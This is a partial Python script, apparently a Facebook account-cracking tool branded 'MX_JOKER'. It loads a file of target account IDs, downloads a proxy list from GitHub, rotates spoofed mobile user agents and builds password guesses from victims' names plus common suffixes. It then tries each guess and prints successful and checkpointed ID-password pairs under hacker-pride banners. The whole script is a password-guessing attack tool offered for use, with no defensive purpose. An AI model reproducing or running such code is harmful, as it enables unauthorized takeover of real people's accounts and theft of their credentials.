...
uas_nokiac2 = "NokiaC2-00/2.0 (03.45) ProMX_JOKER/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Java; U; kau; nokiac2-00) UCBrowser8.3.0.154/70/352/UCWEB Mobile"
...
uas_random = random.choice(["Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36","NokiaC3-00/5.0 (08.63) ProMX_JOKER/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+","Mozilla/5.0 (Linux; Android 10; Nokia 5.1 Plus Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36"])
uas_nokiac3 = "NokiaC3-00/5.0 (08.63) ProMX_JOKER/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+"
...
try:
	prox= requests.get('https://raw.githubusercontent.com/Rananadeem5214/MX_JOKER11/main/.prox.txt').text
	open('.prox.txt','w').write(prox) 
except Exception as e:
...
𝑮𝑰𝑻𝑯𝑼𝑩: 𝑴𝑹 𝑺𝑯𝑨𝑯𝑰 𝑱𝑶𝑲𝑬𝑹

𝐋𝐎𝐕𝐄 𝐀𝐅𝐆𝐇𝐀𝐍𝐈𝐃𝐓𝐀𝐍: 10/10(:

𝐋𝐎𝐕𝐄 𝐀𝐅𝐆𝐇𝐀𝐍𝐈𝐃𝐓𝐀𝐍 𝐇𝐀𝐂𝐊𝐄𝐑) 🔥

𝐇𝐀𝐂𝐊𝐄𝐑 𝐃𝐀 𝐀𝐅𝐆𝐇𝐀𝐍𝐈𝐃𝐓𝐀𝐍
...
def menu():
	...
	print(" [ 1 ] 𝐅𝐈𝐋𝐄 𝐂𝐋𝐎𝐈𝐍𝐆")
	print("")
	MX_JOKER = input(' CHOICE-HALBZHERA= ')
	if MX_JOKER in ['1','01']:
		MX_JOKER()
		exit()
def MX_JOKER():
			...
			try:
				print('')
				print('')
				print('        \033[1;35m PASTE MX_JOKER IN HERE✓         ')
				print('')
				MX_JOKERX = input (' \033[1;35mMX_JOKER DABNE = ');os.system('clear');banner()
				for line in open(MX_JOKERX, 'r').readlines():
					id.append(line.strip())
				setting()
			except IOError:
				exit(" \033[1;31mMX_JOKER WRONG [!]"%(MX_JOKERX))
def setting():
	os.system('clear')
	banner()
		...
		for yuzong in id2:
			...
			if len(nmf)<6:
				if len(frs)<3:
					...
					pwv.append(frs+'afghan123456')
					pwv.append(frs+'khan123')
					pwv.append(frs+'khanoo')
					pwv.append(frs+'afghanistan')
					pwv.append(frs+'afghanistan123456')
					pwv.append(frs+'Haqmal1234')
					pwv.append("Haqmal123"+frs)
					pwv.append("Haqmal"+frs)
					pwv.append("Arman khan"+frs)
					pwv.append("123456"+frs)
					pwv.append("password"+frs)
					pwv.append("PASSWORD"+frs)
					pwv.append("khan Afghan"+frs)
					pwv.append(frs+'@#$%&*-+()')
					pwv.append(frs+'Afg123456')
					pwv.append('Haji khanoo')
					pwv.append('100200')
					pwv.append(frs+frs)
			else:
				if len(frs)<3:
					...
					pwv.append(nmf)
					pwv.append(frs+frs)
					pwv.append(frs+'300400')
					pwv.append(frs+'500500')
					pwv.append(frs+'400500')
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{bo} [MX_JOKER]   {P}{H}{loop} \033[1;32m{P}{P}{H}=\033[1;92m {ok}\r\r\033[1;32m{P} \033[1;31m "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r\033[1;31m [ MX_JOKER-CP ]\033[1;31m  {idf}\033[1;31m |\033[1;31m {pw}')
				...
				print(f'\r\r\033[1;92m [ MX_JOKER-OK ]\033[1;192m  {idf} \033[1;197m| \033[1;32m{pw}')
